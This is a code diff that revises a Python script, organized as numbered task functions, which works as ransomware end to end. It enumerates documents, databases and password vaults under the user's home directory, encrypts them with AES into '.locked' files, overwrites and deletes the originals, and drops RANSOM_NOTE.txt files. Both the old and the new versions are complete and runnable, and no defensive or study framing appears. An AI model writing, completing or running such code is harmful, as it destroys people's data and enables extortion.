@@ -1,73 +1,59 @@
 #!/usr/bin/env python3
-import sys
-import json
-import time
-import os
+import sys, json, time, os
 from typing import Dict, Any
 from pathlib import Path
 from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Define target directories and file extensions
+        sensitive_extensions = {'.docx', '.pdf', '.xlsx', '.txt', '.csv', '.db', '.kdbx'}
         user_home = Path.home()
-        target_extensions = {'.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.jpeg', '.png', '.mp3', '.mp4'}
-
-        # Initialize result variables
         paths = []
         total_size = 0
 
-        # Enumerate files
-        for path in user_home.rglob('*'):
+        for file_path in user_home.rglob('*'):
             try:
-                if path.is_file() and path.suffix.lower() in target_extensions:
-                    paths.append(str(path))
-                    total_size += path.stat().st_size
+                if file_path.suffix in sensitive_extensions:
+                    paths.append(str(file_path))
+                    total_size += file_path.stat().st_size
             except PermissionError:
-                # Skip directories/files where permission is denied
                 continue
 
         result = {'paths': paths, 'total_size': total_size}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial results on failure
-        return {'success': False, 'data': {'paths': paths, 'total_size': total_size},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     encrypted_count = 0
-    encryption_key = get_random_bytes(32)  # AES-256 key size
+    encryption_key = os.urandom(32)
+
     try:
         paths = input_data.get('paths', [])
-        
         for file_path in paths:
-            if os.path.isfile(file_path):
+            try:
                 with open(file_path, 'rb') as f:
                     plaintext = f.read()
-                
-                # Generate a random IV
-                iv = get_random_bytes(16)
+
+                iv = os.urandom(16)
                 cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
-                
-                # Pad plaintext to be a multiple of AES block size
-                padding_length = AES.block_size - len(plaintext) % AES.block_size
-                padded_plaintext = plaintext + bytes([padding_length] * padding_length)
-                
-                # Encrypt the file
-                ciphertext = cipher.encrypt(padded_plaintext)
-                
-                # Write the IV and ciphertext back to the file
-                with open(file_path, 'wb') as f:
+                ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+
+                encrypted_file_path = file_path + '.locked'
+                with open(encrypted_file_path, 'wb') as f:
                     f.write(iv + ciphertext)
-                
+
                 encrypted_count += 1
+
+            except PermissionError:
+                continue
 
         result = {
             'encrypted_count': encrypted_count,
@@ -76,7 +62,6 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result on failure
         result = {
             'encrypted_count': encrypted_count,
             'encryption_key': encryption_key.hex()
@@ -87,27 +72,25 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
+    deleted_count = 0
+
     try:
         paths = input_data.get('paths', [])
-        deleted_count = 0
-
-        for path in paths:
+        
+        for file_path in paths:
             try:
-                # Get the size of the file
-                file_size = os.path.getsize(path)
-
-                # Overwrite the file with random data
-                with open(path, 'r+b') as f:
-                    f.write(os.urandom(file_size))
-                    f.flush()
-                    os.fsync(f.fileno())
-
-                # Delete the file
-                os.remove(path)
-                deleted_count += 1
-
+                if os.path.exists(file_path):
+                    file_size = os.path.getsize(file_path)
+                    
+                    with open(file_path, 'wb') as f:
+                        f.write(os.urandom(file_size))
+                    
+                    os.remove(file_path)
+                    deleted_count += 1
             except FileNotFoundError:
-                # If the file is not found, continue with the next file
+                continue
+            except Exception as e:
+                print(f"Error processing {file_path}: {e}", file=sys.stderr)
                 continue
 
         result = {'deleted_count': deleted_count}
@@ -123,24 +106,24 @@ def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     input_data = input_data or {}
     try:
         paths = input_data.get('paths', [])
-        ransom_note_content = (
-            "Your files have been encrypted. To recover them, you need to pay a ransom. "
-            "Contact us at example@ransom.com for further instructions."
-        )
+        ransom_note_content = "Your files have been encrypted. Contact us to recover your data."
         ransom_note_filename = "RANSOM_NOTE.txt"
         
-        for path in paths:
-            directory = os.path.dirname(path)
-            ransom_note_path = os.path.join(directory, ransom_note_filename)
-            with open(ransom_note_path, 'w') as ransom_note_file:
-                ransom_note_file.write(ransom_note_content)
+        for path_str in paths:
+            try:
+                path = Path(path_str)
+                if path.is_dir():
+                    ransom_note_path = path / ransom_note_filename
+                    with open(ransom_note_path, 'w') as ransom_note_file:
+                        ransom_note_file.write(ransom_note_content)
+            except PermissionError:
+                pass
         
         result = {'dropped': True}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
-        result = {'dropped': False}
-        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': {'dropped': False}, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
 
 def main() -> dict:
